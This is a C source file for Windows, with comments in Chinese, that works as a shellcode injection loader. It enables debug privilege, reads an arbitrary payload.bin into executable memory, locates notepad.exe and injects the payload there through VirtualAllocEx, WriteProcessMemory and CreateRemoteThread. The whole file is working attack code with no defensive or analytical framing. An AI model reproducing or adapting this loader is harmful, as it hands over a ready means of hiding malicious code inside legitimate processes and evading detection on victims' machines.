#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024



BOOL EnableDebugPrivilege()
{
	HANDLE TokenHandle = NULL;
	TOKEN_PRIVILEGES TokenPrivilege;
	LUID uID;
	//打开权限令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle))
	{
		return FALSE;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &uID))
	{
		CloseHandle(TokenHandle);
		TokenHandle = INVALID_HANDLE_VALUE;
		return FALSE;
	}
	TokenPrivilege.PrivilegeCount = 1;
	TokenPrivilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	TokenPrivilege.Privileges[0].Luid = uID;
	if (!AdjustTokenPrivileges(TokenHandle, FALSE, &TokenPrivilege, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
		//调整权限
	{
		CloseHandle(TokenHandle);
		TokenHandle = INVALID_HANDLE_VALUE;
		return  FALSE;
	}
	CloseHandle(TokenHandle);
	TokenHandle = INVALID_HANDLE_VALUE;
	return TRUE;
}

BOOL GetProcessIdByName(LPTSTR szProcessName, LPDWORD lpPID)
{
	// 变量及初始化
	STARTUPINFO st;
	PROCESS_INFORMATION pi;
	PROCESSENTRY32 ps;
	HANDLE hSnapshot;
	ZeroMemory(&st, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	st.cb = sizeof(STARTUPINFO);
	ZeroMemory(&ps, sizeof(PROCESSENTRY32));
	ps.dwSize = sizeof(PROCESSENTRY32);

	// 遍历进程
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if (!Process32First(hSnapshot, &ps))
	{
		return FALSE;
	}
	do
	{
		// 比较进程名
		if (lstrcmpi(ps.szExeFile, szProcessName) == 0)
		{
			// 找到了
			*lpPID = ps.th32ProcessID;
			CloseHandle(hSnapshot);
			return TRUE;
		}
	} while (Process32Next(hSnapshot, &ps));
	// 没有找到
	CloseHandle(hSnapshot);
	return FALSE;
}

int main(int argc, char* argv[]) {

	//为获取其他进程句柄而提权
	if (!EnableDebugPrivilege()) {

		exit(-1);

	}

	//尝试读取当前路径下的payload.bin文件
	HANDLE payloadfile = CreateFile("payload.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (payloadfile == INVALID_HANDLE_VALUE)
	{
		exit(-2);
	}
	//申请存放payload的缓冲区
	char* payloadbuf = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (payloadbuf == NULL)
	{
		exit(-3);
	}

	//将payload读入缓冲区
	BOOL stauts = ReadFile(payloadfile, payloadbuf, PAYLOAD_MAX_SIZE, NULL, NULL);
	if (!stauts)
	{
		exit(-4);
	}

	//获取到待注入进程句柄
	DWORD pid = 0;
	GetProcessIdByName("notepad.exe", &pid);
	if (pid == 0)
	{
		exit(-100);
	}
	printf("the targed procecss is: %d\n", pid);
	HANDLE injectedprocess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (injectedprocess == NULL)
	{
		exit(-5);
	}

	//在目标进程申请内存空间
	LPVOID codeaddr = VirtualAllocEx(injectedprocess, NULL, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (codeaddr == NULL)
	{
		exit(-6);
	}
	//写入payload
	if (!WriteProcessMemory(injectedprocess, codeaddr, payloadbuf, PAYLOAD_MAX_SIZE, NULL))
	{
		exit(-7);
	}
	//执行payload
	HANDLE cHandle = CreateRemoteThread(injectedprocess, NULL, 0, (LPTHREAD_START_ROUTINE)codeaddr, NULL, 0, NULL);
	if (cHandle == NULL)
	{
		exit(-8);
	}
	
	//关闭句柄
	CloseHandle(cHandle);
	CloseHandle(injectedprocess);
	CloseHandle(payloadfile);

}